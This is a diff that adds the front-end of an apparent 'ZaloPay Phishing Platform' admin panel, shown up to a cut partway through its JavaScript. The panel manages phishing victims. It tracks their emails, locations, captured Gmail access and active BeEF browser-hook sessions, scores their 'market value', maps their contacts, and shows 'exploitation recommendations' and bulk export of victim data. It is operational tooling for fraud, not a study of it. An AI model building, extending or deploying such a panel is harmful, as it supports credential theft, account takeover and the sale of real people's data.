@@ -1,0 +1,1187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Victim Management - ZaloPay Phishing Platform</title>
+    
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <!-- D3.js for network visualization -->
+    <script src="https://d3js.org/d3.v7.min.js"></script>
+    <!-- Vis.js for timeline -->
+    <script src="https://unpkg.com/vis-timeline@latest/standalone/umd/vis-timeline-graph2d.min.js"></script>
+    <link href="https://unpkg.com/vis-timeline@latest/styles/vis-timeline-graph2d.css" rel="stylesheet">
+    
+    <style>
+        .victim-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+            border-left: 4px solid #007bff;
+            transition: transform 0.2s ease;
+        }
+        
+        .victim-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.12);
+        }
+        
+        .victim-card.high-risk { border-left-color: #dc3545; }
+        .victim-card.medium-risk { border-left-color: #ffc107; }
+        .victim-card.low-risk { border-left-color: #28a745; }
+        
+        .risk-badge {
+            font-size: 0.75rem;
+            padding: 0.25rem 0.5rem;
+            border-radius: 0.375rem;
+        }
+        
+        .risk-critical { background: #dc3545; color: white; }
+        .risk-high { background: #fd7e14; color: white; }
+        .risk-medium { background: #ffc107; color: black; }
+        .risk-low { background: #28a745; color: white; }
+        
+        .intelligence-score {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #007bff;
+        }
+        
+        .network-graph {
+            height: 500px;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            background: #f8f9fa;
+        }
+        
+        .timeline-container {
+            height: 400px;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            background: white;
+        }
+        
+        .bulk-operations-panel {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .victim-table {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .table th {
+            background: #007bff;
+            color: white;
+            border: none;
+            font-weight: 600;
+        }
+        
+        .table td {
+            vertical-align: middle;
+            border-color: #dee2e6;
+        }
+        
+        .search-filters {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .analytics-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .recommendation-item {
+            background: #f8f9fa;
+            border-left: 4px solid #007bff;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .recommendation-item.high-priority { border-left-color: #dc3545; }
+        .recommendation-item.medium-priority { border-left-color: #ffc107; }
+        
+        .loading-spinner {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .victim-actions {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .victim-actions .btn {
+            padding: 0.25rem 0.5rem;
+            font-size: 0.875rem;
+        }
+        
+        .network-node {
+            cursor: pointer;
+        }
+        
+        .network-link {
+            stroke: #999;
+            stroke-opacity: 0.6;
+        }
+        
+        .network-label {
+            font-size: 12px;
+            font-family: Arial, sans-serif;
+        }
+
+        #selectedCount {
+            height: auto;
+            min-height: 38px;
+        }
+
+        #victimTable {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <!-- Header -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="analytics-card">
+                    <div class="d-flex justify-content-between align-items-center">
+                        <div>
+                            <h1 class="h3 mb-0">
+                                <i class="fas fa-users me-2"></i>
+                                Advanced Victim Management
+                            </h1>
+                            <p class="mb-0">Comprehensive victim analysis, network mapping, and exploitation recommendations</p>
+                        </div>
+                        <div class="d-flex align-items-center gap-3">
+                            <div class="text-center">
+                                <div class="h4 mb-0" id="totalVictims">0</div>
+                                <small>Total Victims</small>
+                            </div>
+                            <div class="text-center">
+                                <div class="h4 mb-0" id="activeAnalysis">0</div>
+                                <small>Active Analysis</small>
+                            </div>
+                            <button class="btn btn-light" onclick="refreshData()">
+                                <i class="fas fa-sync-alt me-1"></i>
+                                Refresh
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bulk Operations Panel -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="bulk-operations-panel">
+                    <h5 class="mb-3">
+                        <i class="fas fa-tasks me-2"></i>
+                        Bulk Operations
+                    </h5>
+                    <div class="row">
+                        <div class="col-md-3">
+                            <div class="form-group">
+                                <label class="form-label">Selected Victims</label>
+                                <div class="form-control" id="selectedCount">
+                                    <span class="text-muted">No victims selected</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="form-group">
+                                <label class="form-label">Operation</label>
+                                <select class="form-select" id="bulkOperation" title="Select bulk operation to perform">
+                                    <option value="">Select Operation</option>
+                                    <option value="analyze">Analyze Victims</option>
+                                    <option value="tag">Add Tag</option>
+                                    <option value="export">Export Data</option>
+                                    <option value="delete">Delete Victims</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="form-group">
+                                <label class="form-label">Parameters</label>
+                                <input type="text" class="form-control" id="bulkParameters" placeholder="Enter parameters">
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="form-group">
+                                <label class="form-label">&nbsp;</label>
+                                <button class="btn btn-primary d-block w-100" onclick="executeBulkOperation()">
+                                    <i class="fas fa-play me-1"></i>
+                                    Execute
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Search and Filters -->
+        <div class="row mb-4">
+            <div class="col-12">
+                <div class="search-filters">
+                    <h5 class="mb-3">
+                        <i class="fas fa-search me-2"></i>
+                        Advanced Search & Filters
+                    </h5>
+                    <div class="row">
+                        <div class="col-md-3">
+                            <div class="form-group">
+                                <label class="form-label">Search Query</label>
+                                <input type="text" class="form-control" id="searchQuery" placeholder="Search victims...">
+                            </div>
+                        </div>
+                        <div class="col-md-2">
+                            <div class="form-group">
+                                <label class="form-label">Risk Level</label>
+                                <select class="form-select" id="riskFilter" title="Filter victims by risk level">
+                                    <option value="">All Risk Levels</option>
+                                    <option value="critical">Critical</option>
+                                    <option value="high">High</option>
+                                    <option value="medium">Medium</option>
+                                    <option value="low">Low</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-2">
+                            <div class="form-group">
+                                <label class="form-label">Country</label>
+                                <select class="form-select" id="countryFilter" title="Filter victims by country">
+                                    <option value="">All Countries</option>
+                                    <option value="Vietnam">Vietnam</option>
+                                    <option value="United States">United States</option>
+                                    <option value="United Kingdom">United Kingdom</option>
+                                    <option value="Canada">Canada</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-2">
+                            <div class="form-group">
+                                <label class="form-label">Gmail Access</label>
+                                <select class="form-select" id="gmailFilter" title="Filter victims by Gmail access status">
+                                    <option value="">All</option>
+                                    <option value="true">Has Access</option>
+                                    <option value="false">No Access</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-2">
+                            <div class="form-group">
+                                <label class="form-label">BeEF Session</label>
+                                <select class="form-select" id="beefFilter" title="Filter victims by BeEF session status">
+                                    <option value="">All</option>
+                                    <option value="true">Active</option>
+                                    <option value="false">Inactive</option>
+                                </select>
+                            </div>
+                        </div>
+                        <div class="col-md-1">
+                            <div class="form-group">
+                                <label class="form-label">&nbsp;</label>
+                                <button class="btn btn-outline-primary d-block w-100" onclick="applyFilters()" title="Apply search and filter criteria">
+                                    <i class="fas fa-filter"></i>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content Tabs -->
+        <div class="row">
+            <div class="col-12">
+                <ul class="nav nav-tabs" id="victimTabs" role="tablist">
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link active" id="list-tab" data-bs-toggle="tab" data-bs-target="#list" type="button" role="tab">
+                            <i class="fas fa-list me-1"></i>
+                            Victim List
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="network-tab" data-bs-toggle="tab" data-bs-target="#network" type="button" role="tab">
+                            <i class="fas fa-project-diagram me-1"></i>
+                            Network Graph
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="timeline-tab" data-bs-toggle="tab" data-bs-target="#timeline" type="button" role="tab">
+                            <i class="fas fa-timeline me-1"></i>
+                            Timeline Analysis
+                        </button>
+                    </li>
+                    <li class="nav-item" role="presentation">
+                        <button class="nav-link" id="analytics-tab" data-bs-toggle="tab" data-bs-target="#analytics" type="button" role="tab">
+                            <i class="fas fa-chart-bar me-1"></i>
+                            Analytics
+                        </button>
+                    </li>
+                </ul>
+                
+                <div class="tab-content" id="victimTabContent">
+                    <!-- Victim List Tab -->
+                    <div class="tab-pane fade show active" id="list" role="tabpanel">
+                        <div class="victim-table mt-3">
+                            <div class="loading-spinner" id="listLoading">
+                                <i class="fas fa-spinner fa-spin fa-2x"></i>
+                                <p>Loading victims...</p>
+                            </div>
+                            <table class="table table-hover mb-0" id="victimTable">
+                                <thead>
+                                    <tr>
+                                        <th>
+                                            <input type="checkbox" id="selectAll" onchange="toggleSelectAll()">
+                                        </th>
+                                        <th>Email</th>
+                                        <th>Country</th>
+                                        <th>Risk Level</th>
+                                        <th>Intelligence Score</th>
+                                        <th>Gmail Access</th>
+                                        <th>BeEF Session</th>
+                                        <th>Created</th>
+                                        <th>Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="victimTableBody">
+                                    <!-- Dynamic content -->
+                                </tbody>
+                            </table>
+                        </div>
+                        
+                        <!-- Pagination -->
+                        <nav aria-label="Victim pagination" class="mt-3">
+                            <ul class="pagination justify-content-center" id="pagination">
+                                <!-- Dynamic pagination -->
+                            </ul>
+                        </nav>
+                    </div>
+                    
+                    <!-- Network Graph Tab -->
+                    <div class="tab-pane fade" id="network" role="tabpanel">
+                        <div class="mt-3">
+                            <div class="d-flex justify-content-between align-items-center mb-3">
+                                <h5>Victim Network Graph</h5>
+                                <div class="btn-group">
+                                    <button class="btn btn-outline-primary btn-sm" onclick="refreshNetworkGraph()">
+                                        <i class="fas fa-sync-alt me-1"></i>
+                                        Refresh
+                                    </button>
+                                    <button class="btn btn-outline-secondary btn-sm" onclick="exportNetworkGraph()">
+                                        <i class="fas fa-download me-1"></i>
+                                        Export
+                                    </button>
+                                </div>
+                            </div>
+                            <div class="network-graph" id="networkGraph">
+                                <div class="loading-spinner">
+                                    <i class="fas fa-spinner fa-spin fa-2x"></i>
+                                    <p>Loading network graph...</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Timeline Analysis Tab -->
+                    <div class="tab-pane fade" id="timeline" role="tabpanel">
+                        <div class="mt-3">
+                            <div class="row mb-3">
+                                <div class="col-md-6">
+                                    <h5>Victim Timeline Analysis</h5>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="input-group">
+                                        <input type="text" class="form-control" id="timelineVictimId" placeholder="Enter victim ID">
+                                        <button class="btn btn-outline-primary" onclick="loadVictimTimeline()">
+                                            <i class="fas fa-search me-1"></i>
+                                            Load Timeline
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="timeline-container" id="timelineContainer">
+                                <div class="loading-spinner">
+                                    <i class="fas fa-spinner fa-spin fa-2x"></i>
+                                    <p>Select a victim to view timeline...</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Analytics Tab -->
+                    <div class="tab-pane fade" id="analytics" role="tabpanel">
+                        <div class="mt-3">
+                            <h5 class="mb-3">Victim Analytics Dashboard</h5>
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <div class="card">
+                                        <div class="card-header">
+                                            <h6 class="mb-0">Risk Distribution</h6>
+                                        </div>
+                                        <div class="card-body">
+                                            <canvas id="riskDistributionChart"></canvas>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-6">
+                                    <div class="card">
+                                        <div class="card-header">
+                                            <h6 class="mb-0">Geographic Distribution</h6>
+                                        </div>
+                                        <div class="card-body">
+                                            <canvas id="geographicChart"></canvas>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row mt-3">
+                                <div class="col-md-12">
+                                    <div class="card">
+                                        <div class="card-header">
+                                            <h6 class="mb-0">Intelligence Score Distribution</h6>
+                                        </div>
+                                        <div class="card-body">
+                                            <canvas id="intelligenceChart"></canvas>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Victim Details Modal -->
+    <div class="modal fade" id="victimDetailsModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Victim Details</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" title="Close victim details modal"></button>
+                </div>
+                <div class="modal-body" id="victimDetailsContent">
+                    <!-- Dynamic content -->
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary" onclick="viewRecommendations()">View Recommendations</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Recommendations Modal -->
+    <div class="modal fade" id="recommendationsModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Exploitation Recommendations</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" title="Close victim details modal"></button>
+                </div>
+                <div class="modal-body" id="recommendationsContent">
+                    <!-- Dynamic content -->
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <!-- Victim Management JavaScript -->
+    <script>
+        // Global variables
+        let currentVictims = [];
+        let selectedVictims = new Set();
+        let currentPage = 1;
+        let totalPages = 1;
+        let currentFilters = {};
+        let networkGraph = null;
+        let timelineData = null;
+        let charts = {};
+        
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', function() {
+            loadVictims();
+            initializeCharts();
+            setupEventListeners();
+        });
+        
+        // Setup event listeners
+        function setupEventListeners() {
+            // Search input
+            document.getElementById('searchQuery').addEventListener('input', debounce(applyFilters, 500));
+            
+            // Filter changes
+            ['riskFilter', 'countryFilter', 'gmailFilter', 'beefFilter'].forEach(id => {
+                document.getElementById(id).addEventListener('change', applyFilters);
+            });
+            
+            // Tab changes
+            document.querySelectorAll('[data-bs-toggle="tab"]').forEach(tab => {
+                tab.addEventListener('shown.bs.tab', function(event) {
+                    const target = event.target.getAttribute('data-bs-target');
+                    if (target === '#network') {
+                        loadNetworkGraph();
+                    } else if (target === '#analytics') {
+                        loadAnalytics();
+                    }
+                });
+            });
+        }
+        
+        // Load victims
+        async function loadVictims(page = 1) {
+            try {
+                showLoading('listLoading');
+                
+                const params = new URLSearchParams({
+                    page: page,
+                    page_size: 50,
+                    ...currentFilters
+                });
+                
+                const response = await fetch(`/api/admin/victims/search/advanced?${params}`);
+                const data = await response.json();
+                
+                currentVictims = data.victims || [];
+                currentPage = data.page || 1;
+                totalPages = data.total_pages || 1;
+                
+                renderVictimTable();
+                renderPagination();
+                updateStatistics();
+                
+                hideLoading('listLoading');
+                
+            } catch (error) {
+                console.error('Error loading victims:', error);
+                hideLoading('listLoading');
+                showAlert('Error loading victims', 'danger');
+            }
+        }
+        
+        // Render victim table
+        function renderVictimTable() {
+            const tbody = document.getElementById('victimTableBody');
+            tbody.innerHTML = '';
+            
+            currentVictims.forEach(victim => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>
+                        <input type="checkbox" class="victim-checkbox" value="${victim.victim_id}" 
+                               onchange="toggleVictimSelection('${victim.victim_id}')">
+                    </td>
+                    <td>
+                        <div class="d-flex align-items-center">
+                            <div>
+                                <div class="fw-bold">${victim.email}</div>
+                                <small class="text-muted">${victim.victim_id}</small>
+                            </div>
+                        </div>
+                    </td>
+                    <td>${victim.country || 'Unknown'}</td>
+                    <td>
+                        <span class="risk-badge risk-${victim.risk_level || 'low'}">
+                            ${(victim.risk_level || 'low').toUpperCase()}
+                        </span>
+                    </td>
+                    <td>
+                        <div class="intelligence-score">${victim.intelligence_score || 0}</div>
+                    </td>
+                    <td>
+                        ${victim.gmail_access ? 
+                            '<span class="badge bg-success">Yes</span>' : 
+                            '<span class="badge bg-secondary">No</span>'
+                        }
+                    </td>
+                    <td>
+                        ${victim.beef_session ? 
+                            '<span class="badge bg-warning">Active</span>' : 
+                            '<span class="badge bg-secondary">Inactive</span>'
+                        }
+                    </td>
+                    <td>
+                        <small>${new Date(victim.created_at).toLocaleDateString()}</small>
+                    </td>
+                    <td>
+                        <div class="victim-actions">
+                            <button class="btn btn-sm btn-outline-primary" onclick="viewVictimDetails('${victim.victim_id}')">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                            <button class="btn btn-sm btn-outline-info" onclick="viewRecommendations('${victim.victim_id}')">
+                                <i class="fas fa-lightbulb"></i>
+                            </button>
+                            <button class="btn btn-sm btn-outline-success" onclick="analyzeVictim('${victim.victim_id}')">
+                                <i class="fas fa-search"></i>
+                            </button>
+                        </div>
+                    </td>
+                `;
+                tbody.appendChild(row);
+            });
+            
+            document.getElementById('victimTable').style.display = 'table';
+        }
+        
+        // Render pagination
+        function renderPagination() {
+            const pagination = document.getElementById('pagination');
+            pagination.innerHTML = '';
+            
+            // Previous button
+            const prevLi = document.createElement('li');
+            prevLi.className = `page-item ${currentPage === 1 ? 'disabled' : ''}`;
+            prevLi.innerHTML = `<a class="page-link" href="#" onclick="loadVictims(${currentPage - 1})">Previous</a>`;
+            pagination.appendChild(prevLi);
+            
+            // Page numbers
+            const startPage = Math.max(1, currentPage - 2);
+            const endPage = Math.min(totalPages, currentPage + 2);
+            
+            for (let i = startPage; i <= endPage; i++) {
+                const li = document.createElement('li');
+                li.className = `page-item ${i === currentPage ? 'active' : ''}`;
+                li.innerHTML = `<a class="page-link" href="#" onclick="loadVictims(${i})">${i}</a>`;
+                pagination.appendChild(li);
+            }
+            
+            // Next button
+            const nextLi = document.createElement('li');
+            nextLi.className = `page-item ${currentPage === totalPages ? 'disabled' : ''}`;
+            nextLi.innerHTML = `<a class="page-link" href="#" onclick="loadVictims(${currentPage + 1})">Next</a>`;
+            pagination.appendChild(nextLi);
+        }
+        
+        // Apply filters
+        function applyFilters() {
+            currentFilters = {
+                query: document.getElementById('searchQuery').value,
+                risk_level: document.getElementById('riskFilter').value,
+                country: document.getElementById('countryFilter').value,
+                has_gmail_access: document.getElementById('gmailFilter').value,
+                has_beef_session: document.getElementById('beefFilter').value
+            };
+            
+            // Remove empty filters
+            Object.keys(currentFilters).forEach(key => {
+                if (!currentFilters[key]) {
+                    delete currentFilters[key];
+                }
+            });
+            
+            loadVictims(1);
+        }
+        
+        // Toggle victim selection
+        function toggleVictimSelection(victimId) {
+            if (selectedVictims.has(victimId)) {
+                selectedVictims.delete(victimId);
+            } else {
+                selectedVictims.add(victimId);
+            }
+            updateSelectedCount();
+        }
+        
+        // Toggle select all
+        function toggleSelectAll() {
+            const selectAll = document.getElementById('selectAll');
+            const checkboxes = document.querySelectorAll('.victim-checkbox');
+            
+            checkboxes.forEach(checkbox => {
+                checkbox.checked = selectAll.checked;
+                if (selectAll.checked) {
+                    selectedVictims.add(checkbox.value);
+                } else {
+                    selectedVictims.delete(checkbox.value);
+                }
+            });
+            
+            updateSelectedCount();
+        }
+        
+        // Update selected count
+        function updateSelectedCount() {
+            const count = selectedVictims.size;
+            const countElement = document.getElementById('selectedCount');
+            
+            if (count === 0) {
+                countElement.innerHTML = '<span class="text-muted">No victims selected</span>';
+            } else {
+                countElement.innerHTML = `<span class="badge bg-primary">${count} selected</span>`;
+            }
+        }
+        
+        // Execute bulk operation
+        async function executeBulkOperation() {
+            const operation = document.getElementById('bulkOperation').value;
+            const parameters = document.getElementById('bulkParameters').value;
+            
+            if (!operation) {
+                showAlert('Please select an operation', 'warning');
+                return;
+            }
+            
+            if (selectedVictims.size === 0) {
+                showAlert('Please select victims to perform operation on', 'warning');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/admin/victims/bulk/operations', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        operation: operation,
+                        victim_ids: Array.from(selectedVictims),
+                        parameters: { value: parameters }
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (operation === 'analyze') {
+                    showAlert(`Analysis completed for ${result.analyzed_count} victims`, 'success');
+                } else if (operation === 'tag') {
+                    showAlert(`Tag added to ${result.success_count} victims`, 'success');
+                } else if (operation === 'export') {
+                    // Handle export
+                    downloadFile(result);
+                } else if (operation === 'delete') {
+                    showAlert(`Deleted ${result.success_count} victims`, 'success');
+                    loadVictims(currentPage);
+                }
+                
+                selectedVictims.clear();
+                updateSelectedCount();
+                
+            } catch (error) {
+                console.error('Error executing bulk operation:', error);
+                showAlert('Error executing bulk operation', 'danger');
+            }
+        }
+        
+        // Load network graph
+        async function loadNetworkGraph() {
+            try {
+                const response = await fetch('/api/admin/victims/network/graph');
+                const data = await response.json();
+                
+                renderNetworkGraph(data);
+                
+            } catch (error) {
+                console.error('Error loading network graph:', error);
+                showAlert('Error loading network graph', 'danger');
+            }
+        }
+        
+        // Render network graph
+        function renderNetworkGraph(data) {
+            const container = document.getElementById('networkGraph');
+            container.innerHTML = '';
+            
+            const width = container.offsetWidth;
+            const height = container.offsetHeight;
+            
+            const svg = d3.select(container)
+                .append('svg')
+                .attr('width', width)
+                .attr('height', height);
+            
+            const simulation = d3.forceSimulation(data.nodes)
+                .force('link', d3.forceLink(data.edges).id(d => d.id))
+                .force('charge', d3.forceManyBody().strength(-300))
+                .force('center', d3.forceCenter(width / 2, height / 2));
+            
+            const link = svg.append('g')
+                .selectAll('line')
+                .data(data.edges)
+                .enter().append('line')
+                .attr('class', 'network-link');
+            
+            const node = svg.append('g')
+                .selectAll('circle')
+                .data(data.nodes)
+                .enter().append('circle')
+                .attr('class', 'network-node')
+                .attr('r', d => Math.sqrt(d.degree) * 2 + 5)
+                .attr('fill', d => {
+                    switch (d.type) {
+                        case 'victim': return '#007bff';
+                        case 'contact': return '#28a745';
+                        default: return '#6c757d';
+                    }
+                })
+                .call(d3.drag()
+                    .on('start', dragstarted)
+                    .on('drag', dragged)
+                    .on('end', dragended));
+            
+            const label = svg.append('g')
+                .selectAll('text')
+                .data(data.nodes)
+                .enter().append('text')
+                .attr('class', 'network-label')
+                .text(d => d.id.length > 20 ? d.id.substring(0, 20) + '...' : d.id);
+            
+            simulation.on('tick', () => {
+                link
+                    .attr('x1', d => d.source.x)
+                    .attr('y1', d => d.source.y)
+                    .attr('x2', d => d.target.x)
+                    .attr('y2', d => d.target.y);
+                
+                node
+                    .attr('cx', d => d.x)
+                    .attr('cy', d => d.y);
+                
+                label
+                    .attr('x', d => d.x)
+                    .attr('y', d => d.y);
+            });
+            
+            function dragstarted(event, d) {
+                if (!event.active) simulation.alphaTarget(0.3).restart();
+                d.fx = d.x;
+                d.fy = d.y;
+            }
+            
+            function dragged(event, d) {
+                d.fx = event.x;
+                d.fy = event.y;
+            }
+            
+            function dragended(event, d) {
+                if (!event.active) simulation.alphaTarget(0);
+                d.fx = null;
+                d.fy = null;
+            }
+        }
+        
+        // Load victim timeline
+        async function loadVictimTimeline() {
+            const victimId = document.getElementById('timelineVictimId').value;
+            if (!victimId) {
+                showAlert('Please enter a victim ID', 'warning');
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/api/admin/victims/timeline/${victimId}`);
+                const data = await response.json();
+                
+                renderTimeline(data.events);
+                
+            } catch (error) {
+                console.error('Error loading timeline:', error);
+                showAlert('Error loading timeline', 'danger');
+            }
+        }
+        
+        // Render timeline
+        function renderTimeline(events) {
+            const container = document.getElementById('timelineContainer');
+            container.innerHTML = '';
+            
+            if (events.length === 0) {
+                container.innerHTML = '<div class="text-center p-4"><p>No timeline events found</p></div>';
+                return;
+            }
+            
+            const timelineData = events.map(event => ({
+                id: event.event_id,
+                content: event.description,
+                start: new Date(event.timestamp),
+                className: `timeline-${event.severity}`
+            }));
+            
+            const timeline = new vis.Timeline(container, timelineData, {
+                height: '350px',
+                margin: {
+                    item: 20
+                }
+            });
+        }
+        
+        // Load analytics
+        async function loadAnalytics() {
+            try {
+                const response = await fetch('/api/admin/victims/analytics/summary');
+                const data = await response.json();
+                
+                renderAnalytics(data);
+                
+            } catch (error) {
+                console.error('Error loading analytics:', error);
+                showAlert('Error loading analytics', 'danger');
+            }
+        }
+        
+        // Render analytics
+        function renderAnalytics(data) {
+            // Risk distribution chart
+            if (charts.riskDistribution) {
+                charts.riskDistribution.destroy();
+            }
+            
+            const riskCtx = document.getElementById('riskDistributionChart').getContext('2d');
+            charts.riskDistribution = new Chart(riskCtx, {
+                type: 'doughnut',
+                data: {
+                    labels: Object.keys(data.risk_distribution || {}),
+                    datasets: [{
+                        data: Object.values(data.risk_distribution || {}),
+                        backgroundColor: ['#dc3545', '#fd7e14', '#ffc107', '#28a745']
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+            
+            // Geographic chart
+            if (charts.geographic) {
+                charts.geographic.destroy();
+            }
+            
+            const geoCtx = document.getElementById('geographicChart').getContext('2d');
+            charts.geographic = new Chart(geoCtx, {
+                type: 'bar',
+                data: {
+                    labels: Object.keys(data.geographic_distribution || {}),
+                    datasets: [{
+                        label: 'Victims',
+                        data: Object.values(data.geographic_distribution || {}),
+                        backgroundColor: '#007bff'
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+            
+            // Intelligence chart
+            if (charts.intelligence) {
+                charts.intelligence.destroy();
+            }
+            
+            const intelCtx = document.getElementById('intelligenceChart').getContext('2d');
+            charts.intelligence = new Chart(intelCtx, {
+                type: 'line',
+                data: {
+                    labels: ['0-20', '21-40', '41-60', '61-80', '81-100'],
+                    datasets: [{
+                        label: 'Intelligence Score Distribution',
+                        data: [10, 25, 35, 20, 10], // Mock data
+                        borderColor: '#007bff',
+                        backgroundColor: 'rgba(0, 123, 255, 0.1)',
+                        fill: true
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+        }
+        
+        // Initialize charts
+        function initializeCharts() {
+            // Charts will be initialized when analytics tab is loaded
+        }
+        
+        // View victim details
+        async function viewVictimDetails(victimId) {
+            try {
+                const response = await fetch(`/api/admin/victims/${victimId}`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    const victim = data.victim;
+                    const content = `
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h6>Basic Information</h6>
+                                <p><strong>Email:</strong> ${victim.email}</p>
+                                <p><strong>Country:</strong> ${victim.country || 'Unknown'}</p>
+                                <p><strong>City:</strong> ${victim.city || 'Unknown'}</p>
+                                <p><strong>Created:</strong> ${new Date(victim.created_at).toLocaleString()}</p>
+                            </div>
+                            <div class="col-md-6">
+                                <h6>Status</h6>
+                                <p><strong>Risk Level:</strong> <span class="risk-badge risk-${victim.risk_level}">${victim.risk_level.toUpperCase()}</span></p>
+                                <p><strong>Market Value:</strong> ${victim.market_value || 'Unknown'}</p>
+                                <p><strong>Gmail Access:</strong> ${victim.gmail_access ? 'Yes' : 'No'}</p>
+                                <p><strong>BeEF Session:</strong> ${victim.beef_session ? 'Active' : 'Inactive'}</p>
+                            </div>
+                        </div>
+                    `;
+                    
+                    document.getElementById('victimDetailsContent').innerHTML = content;
+                    new bootstrap.Modal(document.getElementById('victimDetailsModal')).show();
+                }
+                
+            } catch (error) {
+                console.error('Error loading victim details:', error);
+                showAlert('Error loading victim details', 'danger');
+            }
+        }
+        
+        // View recommendations
+        async function viewRecommendations(victimId) {
+            try {
+                const response = await fetch(`/api/admin/victims/recommendations/${victimId}`);
+                const data = await response.json();
+                
+                let content = '<h6>Exploitation Recommendations</h6>';
+                
+                if (data.recommendations.length === 0) {
+                    content += '<p class="text-muted">No recommendations available</p>';
+                } else {
+                    data.recommendations.forEach(rec => {
+                        content += `
+                            <div class="recommendation-item ${rec.priority}-priority">
+                                <div class="d-flex justify-content-between align-items-start">
+                                    <div>
+                                        <h6>${rec.description}</h6>
+                                        <p class="mb-1">Action: ${rec.action}</p>
+                                        <small class="text-muted">Priority: ${rec.priority}</small>
+                                    </div>
+                                    <div class="text-end">
+                                        <div class="h5 mb-0 text-primary">${rec.potential_value}</div>
+                                        <small class="text-muted">Value Score</small>
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    });
+                }
+                
+                document.getElementById('recommendationsContent').innerHTML = content;
+                new bootstrap.Modal(document.getElementById('recommendationsModal')).show();
+                
